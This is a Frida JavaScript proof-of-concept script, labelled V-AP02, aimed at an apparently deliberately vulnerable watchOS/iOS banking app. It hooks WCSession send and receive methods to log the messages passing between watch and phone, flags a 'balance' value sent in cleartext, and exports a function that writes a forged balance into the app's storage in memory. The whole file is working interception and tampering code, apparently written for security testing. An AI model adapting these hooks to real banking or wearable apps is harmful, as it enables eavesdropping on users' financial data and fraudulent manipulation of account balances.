/**
 * Nexora OmniWear - WCSession Interception & Balance Tamper PoC (V-AP02)
 * 
 * Target: NexoraWatch / VulnerableBankApp (Apple watchOS & iOS)
 * Usage:
 *   frida -n NexoraWatch -l scripts/frida_sniff_wcsession.js
 *   frida -n VulnerableBankApp -l scripts/frida_sniff_wcsession.js
 */

console.log("[*] [V-AP02] Initializing WCSession Sniffer & Tamper Script...");

if (ObjC.available) {
    try {
        var WCSession = ObjC.classes.WCSession;
        if (WCSession) {
            console.log("[+] ObjC WCSession class found. Attaching hooks...");

            // 1. Sniff outgoing messages across WCSession
            var sendMessage = WCSession["- sendMessage:replyHandler:errorHandler:"];
            if (sendMessage) {
                Interceptor.attach(sendMessage.implementation, {
                    onEnter: function (args) {
                        var dict = new ObjC.Object(args[2]);
                        console.log("\n[🚨 V-AP02 SNIFF OUTGOING WCSESSION]");
                        console.log("  Payload: " + dict.toString());
                    }
                });
                console.log("[+] Hooked -[WCSession sendMessage:replyHandler:errorHandler:] ✓");
            }

            // 2. Sniff and Tamper incoming messages on WatchSessionManager
            var sessionManager = ObjC.classes.WatchSessionManager;
            if (sessionManager) {
                var recvMsg = sessionManager["- session:didReceiveMessage:replyHandler:"];
                if (recvMsg) {
                    Interceptor.attach(recvMsg.implementation, {
                        onEnter: function (args) {
                            var msg = new ObjC.Object(args[3]);
                            console.log("\n[🚨 V-AP02 SNIFF INCOMING WCSESSION]");
                            console.log("  Raw Message: " + msg.toString());

                            // Tamper demonstration: If balance key is present, log tampering alert
                            if (msg.objectForKey_("balance")) {
                                console.log("  [!] Sensitive financial key 'balance' observed in cleartext!");
                            }
                        }
                    });
                    console.log("[+] Hooked -[WatchSessionManager session:didReceiveMessage:replyHandler:] ✓");
                }
            }

            // 3. Helper function to forge balance in memory
            rpc.exports = {
                forgeBalance: function (forgedAmount) {
                    var storage = ObjC.classes.InsecureStorage;
                    if (storage) {
                        var shared = storage.shared();
                        shared.saveBalance_(forgedAmount);
                        console.log("[🚨 V-AP02] Injected forged balance in RAM: Rp " + forgedAmount);
                        return true;
                    }
                    return false;
                }
            };

            console.log("[*] WCSession Sniffer active! Waiting for inter-device packets...\n");
        } else {
            console.log("[-] WCSession class not available in current process.");
        }
    } catch (e) {
        console.error("[-] Hook error: " + e.message);
    }
} else {
    console.error("[-] Objective-C runtime is not available.");
}

